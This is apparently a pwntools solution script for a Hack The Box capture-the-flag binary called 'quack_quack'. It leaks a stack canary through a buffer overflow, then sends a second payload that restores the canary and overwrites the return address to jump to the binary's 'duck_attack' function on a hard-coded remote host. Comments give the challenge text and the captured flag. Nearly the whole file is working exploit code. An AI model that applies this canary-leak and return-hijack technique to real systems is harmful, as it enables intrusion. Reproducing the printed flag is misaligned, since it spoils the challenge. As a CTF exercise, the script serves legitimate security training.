from pwn import *

context.binary = elf = ELF('quack_quack')

pr = process()
pr = remote('83.136.253.71',33618)
# gdb.attach(pr)
payload = b'A'*89
payload += b'Quack Quack '

pr.send(payload)
pr.recvuntil(b'\n\n> Quack Quack ')
canary = pr.recv(7)
print(canary)

payload_2 = b'a' * 0x58
payload_2 += b'\x00'+canary
payload_2 += p64(0)
payload_2 += p64(elf.sym['duck_attack'])
pr.send(payload_2)
pr.interactive()
# print(pr.recvall(timeout=1))

#Desc = On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it's time to face the Duck!
#category = pwn
#flag = HTB{~c4n4ry_g035_qu4ck_qu4ck~_80bc4cb802a2189f4fc3652d2a5bfa52}